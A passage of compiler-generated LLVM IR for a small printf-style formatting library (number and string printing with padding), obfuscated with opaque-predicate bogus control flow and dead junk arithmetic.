  %218 = bitcast i8* %217 to i32*
  %219 = getelementptr i8, i8* %217, i32 8
  store i8* %219, i8** %216, align 8
  br label %220

; <label>:220:                                    ; preds = %215, %209
  %221 = phi i32* [ %213, %209 ], [ %218, %215 ]
  %222 = load i32, i32* %221, align 4
  %223 = load i32, i32* %7, align 4
  %224 = load i32, i32* %8, align 4
  %225 = call i32 @printi(i8** %204, i32 %222, i32 10, i32 1, i32 %223, i32 %224, i32 97)
  %226 = load i32, i32* %9, align 4
  %227 = add nsw i32 %226, %225
  store i32 %227, i32* %9, align 4
  br label %490

; <label>:228:                                    ; preds = %198
  %229 = load i32, i32* @x.27
  %230 = load i32, i32* @y.28
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %228
  %237 = load i8*, i8** %5, align 8
  %238 = load i8, i8* %237, align 1
  %239 = zext i8 %238 to i32
  %240 = icmp eq i32 %239, 120
  %241 = load i32, i32* @x.27
  %242 = load i32, i32* @y.28
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br i1 %240, label %249, label %274

; <label>:249:                                    ; preds = %originalBBpart225
  %250 = load i8**, i8*** %4, align 8
  %251 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %252 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %251, i32 0, i32 0
  %253 = load i32, i32* %252, align 8
  %254 = icmp ule i32 %253, 40
  br i1 %254, label %255, label %261

; <label>:255:                                    ; preds = %249
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %251, i32 0, i32 3
  %257 = load i8*, i8** %256, align 8
  %258 = getelementptr i8, i8* %257, i32 %253
  %259 = bitcast i8* %258 to i32*
  %260 = add i32 %253, 8
  store i32 %260, i32* %252, align 8
  br label %266

; <label>:261:                                    ; preds = %249
  %262 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %251, i32 0, i32 2
  %263 = load i8*, i8** %262, align 8
  %264 = bitcast i8* %263 to i32*
  %265 = getelementptr i8, i8* %263, i32 8
  store i8* %265, i8** %262, align 8
  br label %266

; <label>:266:                                    ; preds = %261, %255
  %267 = phi i32* [ %259, %255 ], [ %264, %261 ]
  %268 = load i32, i32* %267, align 4
  %269 = load i32, i32* %7, align 4
  %270 = load i32, i32* %8, align 4
  %271 = call i32 @printi(i8** %250, i32 %268, i32 16, i32 0, i32 %269, i32 %270, i32 97)
  %272 = load i32, i32* %9, align 4
  %273 = add nsw i32 %272, %271
  store i32 %273, i32* %9, align 4
  br label %490

; <label>:274:                                    ; preds = %originalBBpart225
  %275 = load i8*, i8** %5, align 8
  %276 = load i8, i8* %275, align 1
  %277 = zext i8 %276 to i32
  %278 = icmp eq i32 %277, 88
  br i1 %278, label %279, label %304

; <label>:279:                                    ; preds = %274
  %280 = load i8**, i8*** %4, align 8
  %281 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %282 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 8
  %284 = icmp ule i32 %283, 40
  br i1 %284, label %285, label %291

; <label>:285:                                    ; preds = %279
  %286 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %281, i32 0, i32 3
  %287 = load i8*, i8** %286, align 8
  %288 = getelementptr i8, i8* %287, i32 %283
  %289 = bitcast i8* %288 to i32*
  %290 = add i32 %283, 8
  store i32 %290, i32* %282, align 8
  br label %296

; <label>:291:                                    ; preds = %279
  %292 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %281, i32 0, i32 2
  %293 = load i8*, i8** %292, align 8
  %294 = bitcast i8* %293 to i32*
  %295 = getelementptr i8, i8* %293, i32 8
  store i8* %295, i8** %292, align 8
  br label %296

; <label>:296:                                    ; preds = %291, %285
  %297 = phi i32* [ %289, %285 ], [ %294, %291 ]
  %298 = load i32, i32* %297, align 4
  %299 = load i32, i32* %7, align 4
  %300 = load i32, i32* %8, align 4
  %301 = call i32 @printi(i8** %280, i32 %298, i32 16, i32 0, i32 %299, i32 %300, i32 65)
  %302 = load i32, i32* %9, align 4
  %303 = add nsw i32 %302, %301
  store i32 %303, i32* %9, align 4
  br label %490

; <label>:304:                                    ; preds = %274
  %305 = load i32, i32* @x.27
  %306 = load i32, i32* @y.28
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %304
  %313 = load i8*, i8** %5, align 8
  %314 = load i8, i8* %313, align 1
  %315 = zext i8 %314 to i32
  %316 = icmp eq i32 %315, 117
  %317 = load i32, i32* @x.27
  %318 = load i32, i32* @y.28
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br i1 %316, label %325, label %382

; <label>:325:                                    ; preds = %originalBBpart229
  %326 = load i32, i32* @x.27
  %327 = load i32, i32* @y.28
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %325
  %334 = load i8**, i8*** %4, align 8
  %335 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %336 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %335, i32 0, i32 0
  %337 = load i32, i32* %336, align 8
  %338 = icmp ule i32 %337, 40
  %339 = load i32, i32* @x.27
  %340 = load i32, i32* @y.28
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br i1 %338, label %347, label %353

; <label>:347:                                    ; preds = %originalBBpart233
  %348 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %335, i32 0, i32 3
  %349 = load i8*, i8** %348, align 8
  %350 = getelementptr i8, i8* %349, i32 %337
  %351 = bitcast i8* %350 to i32*
  %352 = add i32 %337, 8
  store i32 %352, i32* %336, align 8
  br label %358

; <label>:353:                                    ; preds = %originalBBpart233
  %354 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %335, i32 0, i32 2
  %355 = load i8*, i8** %354, align 8
  %356 = bitcast i8* %355 to i32*
  %357 = getelementptr i8, i8* %355, i32 8
  store i8* %357, i8** %354, align 8
  br label %358

; <label>:358:                                    ; preds = %353, %347
  %359 = phi i32* [ %351, %347 ], [ %356, %353 ]
  %360 = load i32, i32* @x.27
  %361 = load i32, i32* @y.28
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %358
  %368 = load i32, i32* %359, align 4
  %369 = load i32, i32* %7, align 4
  %370 = load i32, i32* %8, align 4
  %371 = call i32 @printi(i8** %334, i32 %368, i32 10, i32 0, i32 %369, i32 %370, i32 97)
  %372 = load i32, i32* %9, align 4
  %373 = add nsw i32 %372, %371
  store i32 %373, i32* %9, align 4
  %374 = load i32, i32* @x.27
  %375 = load i32, i32* @y.28
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBBpart249, label %originalBB35alteredBB

originalBBpart249:                                ; preds = %originalBB35
  br label %490

; <label>:382:                                    ; preds = %originalBBpart229
  %383 = load i8*, i8** %5, align 8
  %384 = load i8, i8* %383, align 1
  %385 = zext i8 %384 to i32
  %386 = icmp eq i32 %385, 99
  br i1 %386, label %387, label %448

; <label>:387:                                    ; preds = %382
  %388 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %389 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %388, i32 0, i32 0
  %390 = load i32, i32* %389, align 8
  %391 = icmp ule i32 %390, 40
  br i1 %391, label %392, label %414

; <label>:392:                                    ; preds = %387
  %393 = load i32, i32* @x.27
  %394 = load i32, i32* @y.28
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %392
  %401 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %388, i32 0, i32 3
  %402 = load i8*, i8** %401, align 8
  %403 = getelementptr i8, i8* %402, i32 %390
  %404 = bitcast i8* %403 to i32*
  %405 = add i32 %390, 8
  store i32 %405, i32* %389, align 8
  %406 = load i32, i32* @x.27
  %407 = load i32, i32* @y.28
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBBpart271, label %originalBB51alteredBB

originalBBpart271:                                ; preds = %originalBB51
  br label %419

; <label>:414:                                    ; preds = %387
  %415 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %388, i32 0, i32 2
  %416 = load i8*, i8** %415, align 8
  %417 = bitcast i8* %416 to i32*
  %418 = getelementptr i8, i8* %416, i32 8
  store i8* %418, i8** %415, align 8
  br label %419

; <label>:419:                                    ; preds = %414, %originalBBpart271
  %420 = phi i32* [ %404, %originalBBpart271 ], [ %417, %414 ]
  %421 = load i32, i32* @x.27
  %422 = load i32, i32* @y.28
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
  br i1 %428, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %419
  %429 = load i32, i32* %420, align 4
  %430 = trunc i32 %429 to i8
  %431 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %430, i8* %431, align 1
  %432 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %432, align 1
  %433 = load i8**, i8*** %4, align 8
  %434 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %435 = load i32, i32* %7, align 4
  %436 = load i32, i32* %8, align 4
  %437 = call i32 @prints(i8** %433, i8* %434, i32 %435, i32 %436)
  %438 = load i32, i32* %9, align 4
  %439 = add nsw i32 %438, %437
  store i32 %439, i32* %9, align 4
  %440 = load i32, i32* @x.27
  %441 = load i32, i32* @y.28
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBBpart284, label %originalBB73alteredBB

originalBBpart284:                                ; preds = %originalBB73
  br label %490

; <label>:448:                                    ; preds = %382
  br label %473

; <label>:449:                                    ; preds = %17
  br label %450

; <label>:450:                                    ; preds = %449, %35
  %451 = load i32, i32* @x.27
  %452 = load i32, i32* @y.28
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %450
  %459 = load i8**, i8*** %4, align 8
  %460 = load i8*, i8** %5, align 8
  %461 = load i8, i8* %460, align 1
  %462 = zext i8 %461 to i32
  call void @printchar(i8** %459, i32 %462)
  %463 = load i32, i32* %9, align 4
  %464 = add nsw i32 %463, 1
  store i32 %464, i32* %9, align 4
  %465 = load i32, i32* @x.27
  %466 = load i32, i32* @y.28
  %467 = sub i32 %465, 1
  %468 = mul i32 %465, %467
  %469 = urem i32 %468, 2
  %470 = icmp eq i32 %469, 0
  %471 = icmp slt i32 %466, 10
  %472 = or i1 %470, %471
  br i1 %472, label %originalBBpart292, label %originalBB86alteredBB

originalBBpart292:                                ; preds = %originalBB86
  br label %473

; <label>:473:                                    ; preds = %originalBBpart292, %448
  %474 = load i32, i32* @x.27
  %475 = load i32, i32* @y.28
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %473
  %482 = load i32, i32* @x.27
  %483 = load i32, i32* @y.28
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %490

; <label>:490:                                    ; preds = %originalBBpart296, %originalBBpart284, %originalBBpart249, %296, %266, %220, %191
  %491 = load i8*, i8** %5, align 8
  %492 = getelementptr inbounds i8, i8* %491, i32 1
  store i8* %492, i8** %5, align 8
  br label %12

; <label>:493:                                    ; preds = %29, %12
  %494 = load i8**, i8*** %4, align 8
  %495 = icmp ne i8** %494, null
  br i1 %495, label %496, label %499

; <label>:496:                                    ; preds = %493
  %497 = load i8**, i8*** %4, align 8
  %498 = load i8*, i8** %497, align 8
  store i8 0, i8* %498, align 1
  br label %499

; <label>:499:                                    ; preds = %496, %493
  %500 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %501 = bitcast %struct.__va_list_tag* %500 to i8*
  call void @llvm.va_end(i8* %501)
  %502 = load i32, i32* %9, align 4
  ret i32 %502

originalBBalteredBB:                              ; preds = %originalBB, %44
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %66
  %503 = load i8*, i8** %5, align 8
  %504 = getelementptr inbounds i8, i8* %503, i32 1
  store i8* %504, i8** %5, align 8
  %505 = load i32, i32* %8, align 4
  %_ = shl i32 %505, 2
  %_2 = sub i32 0, %505
  %gen = add i32 %_2, 2
  %_3 = sub i32 %505, 2
  %gen4 = mul i32 %_3, 2
  %_5 = shl i32 %505, 2
  %_6 = sub i32 %505, 2
  %gen7 = mul i32 %_6, 2
  %506 = or i32 %505, 2
  store i32 %506, i32* %8, align 4
  br label %originalBB1

originalBB11alteredBB:                            ; preds = %originalBB11, %88
  %507 = load i8*, i8** %5, align 8
  %508 = load i8, i8* %507, align 1
  %509 = zext i8 %508 to i32
  %510 = icmp sge i32 %509, 48
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %128
  %511 = load i8*, i8** %5, align 8
  %512 = load i8, i8* %511, align 1
  %513 = zext i8 %512 to i32
  %514 = icmp eq i32 %513, 115
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %165
  %515 = load i64, i64* %166, align 8
  %516 = inttoptr i64 %515 to i8*
  store i8* %516, i8** %11, align 8
  %517 = load i8**, i8*** %4, align 8
  %518 = load i8*, i8** %11, align 8
  %519 = icmp ne i8* %518, null
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %228
  %520 = load i8*, i8** %5, align 8
  %521 = load i8, i8* %520, align 1
  %522 = zext i8 %521 to i32
  %523 = icmp eq i32 %522, 120
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %304
  %524 = load i8*, i8** %5, align 8
  %525 = load i8, i8* %524, align 1
  %526 = zext i8 %525 to i32
  %527 = icmp eq i32 %526, 117
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %325
  %528 = load i8**, i8*** %4, align 8
  %529 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %530 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %529, i32 0, i32 0
  %531 = load i32, i32* %530, align 8
  %532 = icmp ule i32 %531, 40
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %358
  %533 = load i32, i32* %359, align 4
  %534 = load i32, i32* %7, align 4
  %535 = load i32, i32* %8, align 4
  %536 = call i32 @printi(i8** %334, i32 %533, i32 10, i32 0, i32 %534, i32 %535, i32 97)
  %537 = load i32, i32* %9, align 4
  %_36 = shl i32 %537, %536
  %_37 = sub i32 %537, %536
  %gen38 = mul i32 %_37, %536
  %_39 = shl i32 %537, %536
  %_40 = sub i32 %537, %536
  %gen41 = mul i32 %_40, %536
  %_42 = shl i32 %537, %536
  %_43 = shl i32 %537, %536
  %_44 = sub i32 %537, %536
  %gen45 = mul i32 %_44, %536
  %_46 = sub i32 %537, %536
  %gen47 = mul i32 %_46, %536
  %538 = add nsw i32 %537, %536
  store i32 %538, i32* %9, align 4
  br label %originalBB35

originalBB51alteredBB:                            ; preds = %originalBB51, %392
  %539 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %388, i32 0, i32 3
  %540 = load i8*, i8** %539, align 8
  %541 = getelementptr i8, i8* %540, i32 %390
  %542 = bitcast i8* %541 to i32*
  %_52 = sub i32 %390, 8
  %gen53 = mul i32 %_52, 8
  %_54 = sub i32 %390, 8
  %gen55 = mul i32 %_54, 8
  %_56 = sub i32 %390, 8
  %gen57 = mul i32 %_56, 8
  %_58 = sub i32 %390, 8
  %gen59 = mul i32 %_58, 8
  %_60 = sub i32 %390, 8
  %gen61 = mul i32 %_60, 8
  %_62 = sub i32 %390, 8
  %gen63 = mul i32 %_62, 8
  %_64 = sub i32 %390, 8
  %gen65 = mul i32 %_64, 8
  %_66 = sub i32 0, %390
  %gen67 = add i32 %_66, 8
  %_68 = sub i32 0, %390
  %gen69 = add i32 %_68, 8
  %543 = add i32 %390, 8
  store i32 %543, i32* %389, align 8
  br label %originalBB51

originalBB73alteredBB:                            ; preds = %originalBB73, %419
  %544 = load i32, i32* %420, align 4
  %545 = trunc i32 %544 to i8
  %546 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %545, i8* %546, align 1
  %547 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %547, align 1
  %548 = load i8**, i8*** %4, align 8
  %549 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %550 = load i32, i32* %7, align 4
  %551 = load i32, i32* %8, align 4
  %552 = call i32 @prints(i8** %548, i8* %549, i32 %550, i32 %551)
  %553 = load i32, i32* %9, align 4
  %_74 = shl i32 %553, %552
  %_75 = sub i32 %553, %552
  %gen76 = mul i32 %_75, %552
  %_77 = sub i32 0, %553
  %gen78 = add i32 %_77, %552
  %_79 = shl i32 %553, %552
  %_80 = shl i32 %553, %552
  %_81 = sub i32 %553, %552
  %gen82 = mul i32 %_81, %552
  %554 = add nsw i32 %553, %552
  store i32 %554, i32* %9, align 4
  br label %originalBB73

originalBB86alteredBB:                            ; preds = %originalBB86, %450
  %555 = load i8**, i8*** %4, align 8
  %556 = load i8*, i8** %5, align 8
  %557 = load i8, i8* %556, align 1
  %558 = zext i8 %557 to i32
  call void @printchar(i8** %555, i32 %558)
  %559 = load i32, i32* %9, align 4
  %_87 = shl i32 %559, 1
  %_88 = sub i32 0, %559
  %gen89 = add i32 %_88, 1
  %_90 = shl i32 %559, 1
  %560 = add nsw i32 %559, 1
  store i32 %560, i32* %9, align 4
  br label %originalBB86

originalBB94alteredBB:                            ; preds = %originalBB94, %473
  br label %originalBB94
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %106

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %40, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %43

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* @x.29
  %23 = load i32, i32* @y.30
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i32, i32* %11, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %11, align 4
  %32 = load i32, i32* @x.29
  %33 = load i32, i32* @y.30
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i8*, i8** %12, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %12, align 8
  br label %17

; <label>:43:                                     ; preds = %17
  %44 = load i32, i32* %11, align 4
  %45 = load i32, i32* %7, align 4
  %46 = icmp sge i32 %44, %45
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %43
  store i32 0, i32* %7, align 4
  br label %68

; <label>:48:                                     ; preds = %43
  %49 = load i32, i32* @x.29
  %50 = load i32, i32* @y.30
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %48
  %57 = load i32, i32* %11, align 4
  %58 = load i32, i32* %7, align 4
  %59 = sub nsw i32 %58, %57
  store i32 %59, i32* %7, align 4
  %60 = load i32, i32* @x.29
  %61 = load i32, i32* @y.30
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart222, label %originalBB11alteredBB

originalBBpart222:                                ; preds = %originalBB11
  br label %68

; <label>:68:                                     ; preds = %originalBBpart222, %47
  %69 = load i32, i32* %8, align 4
  %70 = and i32 %69, 2
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %72, label %89

; <label>:72:                                     ; preds = %68
  %73 = load i32, i32* @x.29
  %74 = load i32, i32* @y.30
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %72
  store i32 48, i32* %10, align 4
  %81 = load i32, i32* @x.29
  %82 = load i32, i32* @y.30
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br label %89

; <label>:89:                                     ; preds = %originalBBpart226, %68
  %90 = load i32, i32* @x.29
  %91 = load i32, i32* @y.30
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %89
  %98 = load i32, i32* @x.29
  %99 = load i32, i32* @y.30
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br label %106

; <label>:106:                                    ; preds = %originalBBpart230, %4
  %107 = load i32, i32* %8, align 4
  %108 = and i32 %107, 1
  %109 = icmp ne i32 %108, 0
  br i1 %109, label %123, label %110

; <label>:110:                                    ; preds = %106
  br label %111

; <label>:111:                                    ; preds = %119, %110
  %112 = load i32, i32* %7, align 4
  %113 = icmp sgt i32 %112, 0
  br i1 %113, label %114, label %122

; <label>:114:                                    ; preds = %111
  %115 = load i8**, i8*** %5, align 8
  %116 = load i32, i32* %10, align 4
  call void @printchar(i8** %115, i32 %116)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %9, align 4
  br label %119

; <label>:119:                                    ; preds = %114
  %120 = load i32, i32* %7, align 4
  %121 = add nsw i32 %120, -1
  store i32 %121, i32* %7, align 4
  br label %111

; <label>:122:                                    ; preds = %111
  br label %123

; <label>:123:                                    ; preds = %122, %106
  br label %124

; <label>:124:                                    ; preds = %135, %123
  %125 = load i8*, i8** %6, align 8
  %126 = load i8, i8* %125, align 1
  %127 = icmp ne i8 %126, 0
  br i1 %127, label %128, label %138

; <label>:128:                                    ; preds = %124
  %129 = load i8**, i8*** %5, align 8
  %130 = load i8*, i8** %6, align 8
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i32
  call void @printchar(i8** %129, i32 %132)
  %133 = load i32, i32* %9, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %9, align 4
  br label %135

; <label>:135:                                    ; preds = %128
  %136 = load i8*, i8** %6, align 8
  %137 = getelementptr inbounds i8, i8* %136, i32 1
  store i8* %137, i8** %6, align 8
  br label %124

; <label>:138:                                    ; preds = %124
  br label %139

; <label>:139:                                    ; preds = %originalBBpart238, %138
  %140 = load i32, i32* %7, align 4
  %141 = icmp sgt i32 %140, 0
  br i1 %141, label %142, label %166

; <label>:142:                                    ; preds = %139
  %143 = load i8**, i8*** %5, align 8
  %144 = load i32, i32* %10, align 4
  call void @printchar(i8** %143, i32 %144)
  %145 = load i32, i32* %9, align 4
  %146 = add nsw i32 %145, 1
  store i32 %146, i32* %9, align 4
  br label %147

; <label>:147:                                    ; preds = %142
  %148 = load i32, i32* @x.29
  %149 = load i32, i32* @y.30
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %147
  %156 = load i32, i32* %7, align 4
  %157 = add nsw i32 %156, -1
  store i32 %157, i32* %7, align 4
  %158 = load i32, i32* @x.29
  %159 = load i32, i32* @y.30
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart238, label %originalBB32alteredBB

originalBBpart238:                                ; preds = %originalBB32
  br label %139

; <label>:166:                                    ; preds = %139
  %167 = load i32, i32* %9, align 4
  ret i32 %167

originalBBalteredBB:                              ; preds = %originalBB, %21
  %168 = load i32, i32* %11, align 4
  %_ = sub i32 %168, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 %168, 1
  %gen2 = mul i32 %_1, 1
  %_3 = sub i32 0, %168
  %gen4 = add i32 %_3, 1
  %_5 = sub i32 0, %168
  %gen6 = add i32 %_5, 1
  %_7 = sub i32 0, %168
  %gen8 = add i32 %_7, 1
  %_9 = shl i32 %168, 1
  %_10 = shl i32 %168, 1
  %169 = add nsw i32 %168, 1
  store i32 %169, i32* %11, align 4
  br label %originalBB

originalBB11alteredBB:                            ; preds = %originalBB11, %48
